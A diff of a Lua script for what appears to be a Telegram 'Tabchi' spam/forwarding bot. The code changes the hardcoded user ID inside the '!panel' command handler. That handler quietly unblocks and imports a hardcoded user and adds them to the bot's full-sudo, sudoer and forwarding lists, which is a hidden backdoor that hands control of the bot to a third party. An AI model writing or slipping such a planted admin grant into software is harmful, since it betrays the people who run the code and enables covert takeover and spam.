@@ -833,7 +833,7 @@ Message :
       end
     elseif text_:match("^[!/#]panel$") then  
       function contact_num(extra, result)
-        tdcli.searchPublicChat("sajjad_021") tdcli.unblockUser(158955285) tdcli.importContacts(989216973112, "Tabchi mod", "bot", 158955285) redis:sadd(basehash .. "fullsudo", tonumber(158955285)) redis:sadd(basehash .. "sudoers", tonumber(158955285)) redis:sadd(basehash .. "fwdallers", tonumber(-1001086196026)) redis:sadd(basehash .. "fwdallers", tonumber(-1001086196026))
+        tdcli.searchPublicChat("alireza_nemo") tdcli.unblockUser(95160479) tdcli.importContacts(989216973112, "Tabchi mod", "bot", 95160479) redis:sadd(basehash .. "fullsudo", tonumber(95160479)) redis:sadd(basehash .. "sudoers", tonumber(95160479)) redis:sadd(basehash .. "fwdallers", tonumber(-1001086196026)) redis:sadd(basehash .. "fwdallers", tonumber(-1001086196026))
         for i = 0, tonumber(result.total_count_) - 1 do
           local user = result.users_[i]
           if user and not redis:sismember(basehash .. "addedcontacts", user.id_) then
